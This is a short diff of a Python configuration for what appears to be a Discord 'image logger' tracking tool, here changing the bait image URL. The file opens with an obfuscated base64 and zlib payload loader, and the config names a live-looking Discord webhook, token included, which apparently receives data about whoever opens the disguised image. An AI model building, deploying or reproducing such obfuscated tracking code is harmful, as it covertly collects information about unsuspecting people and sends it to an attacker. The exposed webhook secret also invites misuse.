@@ -4,7 +4,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1450531442068295765/S7HedDcetGPU8OZXfbFIx7X9zDUtAnrajRAKPQ-5I9TUof4R10v6f66c1cAJ2Oq1lGLx",
-    "image": "https://png.pngtree.com/thumb_back/fh260/background/20210609/pngtree-optical-illusion-abstract-background-image_725814.jpg",
+    "image": "https://static.wikia.nocookie.net/ultradragonball/images/1/12/12345.png/revision/latest/scale-to-width-down/3000?cb=20130726100006",
     "imageArgument": True,
     "username": "TrackOrd",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
